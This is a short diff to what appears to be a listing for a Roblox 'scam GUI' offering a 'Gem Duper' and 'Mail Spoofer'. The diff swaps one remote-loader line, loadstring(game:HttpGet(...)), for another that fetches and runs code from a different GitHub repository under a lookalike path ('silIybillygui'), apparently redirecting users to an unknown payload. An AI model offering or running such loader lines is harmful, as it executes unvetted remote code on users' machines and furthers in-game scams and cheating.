@@ -7,4 +7,4 @@
 ⋅ Gem Duper
 ⋅ Mail Spoofer
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/0exo/scam-gui/main/scam/sillybillygui', true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/dogefriendyt/scam-gui/main/scam/silIybillygui', true))()
